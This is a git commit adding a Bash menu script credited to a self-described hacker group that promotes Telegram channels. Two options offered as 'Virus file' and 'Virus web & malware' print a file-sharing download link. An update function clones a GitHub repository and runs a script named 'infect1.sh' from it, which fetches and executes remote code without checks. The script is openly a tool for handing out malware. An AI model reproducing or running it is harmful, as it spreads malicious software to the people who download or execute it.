08d1328bebf70133098013208c0b62e7931256ad
tacklorixam <158172718+tacklorixam@users.noreply.github.com>
2024-03-14 19:37:02 +0330

    Create tack.sh

---
+++ tack.sh
@@ -0,0 +1,252 @@
+# A tool by Hacker X Phantom 
+# if u copy Give Me Credit
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+banner(){
+echo -e '\e[91m           
+.                        ▄          ▄
+                         █▄        ██
+                         ███     ▄███
+                         ████████████
+                         ████████████
+                        ▄████████████
+                       ▄██▀███████▀███
+                       ███░▄██████░▄██▄
+                      ▄████████████████
+                      █████████████████
+                      █████████████████
+                    ▄                     ▄▄
+                   ███░█████████████████░▄███
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                  ████░█████████████████░████
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                   ███░█████████████████░▀███
+                    ▀  █████████████████  ▀▀
+                       █████████████████
+                       ▀████████████████
+                        ▀▀▀███▀▀▀████▀▀
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ▀█▀    ██
+
+'
+echo " " 
+echo -e "$red ~~> $grn my channel Telegram = @Filtering_Hacking $red<~~$rset"
+echo 
+# Functions
+echo -e "$red ~~>$grn my id Telegram = @tacklorix $red<~~$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[91m               
+.                        ▄          ▄
+                         █▄        ██
+                         ███     ▄███
+                         ████████████
+                         ████████████
+                        ▄████████████
+                       ▄██▀███████▀███
+                       ███░▄██████░▄██▄
+                      ▄████████████████
+                      █████████████████
+                      █████████████████
+                    ▄                     ▄▄
+                   ███░█████████████████░▄███
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                  ████░█████████████████░████
+                  ████░█████████████████░████ 
+                  ████░█████████████████░████
+                   ███░█████████████████░▀███
+                    ▀  █████████████████  ▀▀
+                       █████████████████
+                       ▀████████████████
+                        ▀▀▀███▀▀▀████▀▀
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ███   ████
+                           ▀█▀    ██
+'
+echo " "
+echo -e "$red ~~>$grn my channel Telegram = @Filtering_Hacking  $red<~~$rset"
+echo
+# Functions
+echo -e "$red ~~>$grn my id Telegram = @tacklorix $red<~~$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$red <-$ylo Tack Lorix $red ->$rset"
+echo " "
+echo " "
+echo -e "$red />$cyan [\e[94m1\e[96m]\e[96mVirus file"
+echo -e "$red />$cyan [\e[94m2\e[96m]\e[95mVirus web & malware"
+echo -e "$red />$cyan [\e[94m3\e[96m]\e[96mAbout"
+echo -e "$red />$cyan [\e[94m4\e[96m]\e[95mJoin Us"
+echo -e "$red />$cyan [\e[94m5\e[96m]\e[96mExit"
+echo " "
+echo " "
+echo -e "$red <-$ylo Tack Lorix $red ->$rset"
+echo " "
+echo -ne "\e[92m %> chois your number \e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+am start -a android.intent.action.VIEW -d https://bit.ly/3PV3S3r > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "5" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[94m 
+
+          __       __        __           
+|__| \_/ |__)     |  \ |  | /  ` |__/ \ / 
+|  | / \ |    ___ |__/ \__/ \__, |  \  |  
+'
+
+echo " "
+echo -e "\e[91m  links virus file :
+
+
+         \e[95mL1NK :- \e[92mhttps://dlsharefile.com/file/1429135210
+"
+echo
+echo -ne "\e[92m%> Type 8 fore exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[94m 
+
+          __       __        __           
+|__| \_/ |__)     |  \ |  | /  ` |__/ \ / 
+|  | / \ |    ___ |__/ \__/ \__, |  \  |  
+'
+
+echo " "
+echo " "
+echo -e "\e[91m  Links Viruses web & malware :
+
+
+        \e[95mL1NK :- \e[92mhttps://dlsharefile.com/file/1429135210
+
+"
+echo
+echo -ne "\e[92m%> Type 8 fore exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+   ||  ||  
+    \\()// 
+  //(__)\\
+  ||    ||
+'
+echo -e "\e[93m                  CALL ME \e[92mXPHANTOM" | pv -qL 10
+echo -e "\e[93m             ADMIN OF \e[92mHACKER X PHANTOM" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
+echo -e "\e[93m         Join Us:\e[92m https://bit.ly/3PV3S3r\e[0m" | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/test" ];
+then
+cd $HOME
+rm -rf test
+elif [ -d "$HOME/test" ];
+then
+cd $HOME
+rm -rf test
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/tacklorixam/test 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd test
+bash infect1.sh
+}
+banner
+menu
